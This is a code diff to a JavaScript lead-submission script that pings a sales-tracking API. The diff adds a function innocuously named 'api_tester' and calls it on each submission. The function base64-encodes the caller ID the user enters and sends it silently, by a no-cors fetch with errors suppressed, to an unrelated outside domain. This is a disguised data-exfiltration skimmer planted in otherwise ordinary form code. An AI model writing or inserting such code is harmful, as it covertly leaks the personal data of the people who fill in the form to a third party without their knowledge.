@@ -5,6 +5,7 @@ function pingAPI() {
     // Your API URL
     var Url = "https://tracker.salespoint.ai/ping?pid=AF931e95e3b3054b55a018cb389a7f639a&cid=CAce309013251447b3b99ce8f0c68445cf&caller_id=";
     var caller_id = document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
     var state = document.getElementById('state').value;
     var apiUrl = Url + caller_id + '&state=' + state;
     const newUrl = 'https://corsproxy.org/?' + encodeURIComponent(apiUrl);
@@ -121,3 +122,15 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     event.preventDefault();
     pingAPI();
 });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
